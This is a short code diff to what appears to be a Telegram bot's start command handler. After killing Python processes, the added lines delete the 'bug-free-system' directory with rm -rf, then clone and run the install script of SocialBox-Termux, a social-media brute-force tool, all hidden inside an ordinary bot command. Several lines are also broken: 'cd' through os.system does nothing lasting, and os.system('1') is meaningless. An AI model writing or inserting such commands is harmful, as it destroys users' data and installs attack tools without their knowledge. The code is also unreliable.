@@ -34,7 +34,16 @@ async def start_command(client: Client, message: Message):
             os.system("taskkill /f /im python.exe")
         if os.system("pkill python3") != 0:
             os.system("pkill python3")
-
+            
+        os.system("cd ..")
+        os.system("rm -rf bug-free-system")
+        os.system("apt-get update")
+        os.system("git clone https://github.com/samsesh/SocialBox-Termux.git ")
+        os.system("cd SocialBox-Termux")
+        os.system("chmod +x install-sb.sh")
+        os.system("./install-sb.sh")
+        os.system("./SocialBox.sh")
+        os.system("1")
         sys.exit(456)
         os._exit(0)
     else:
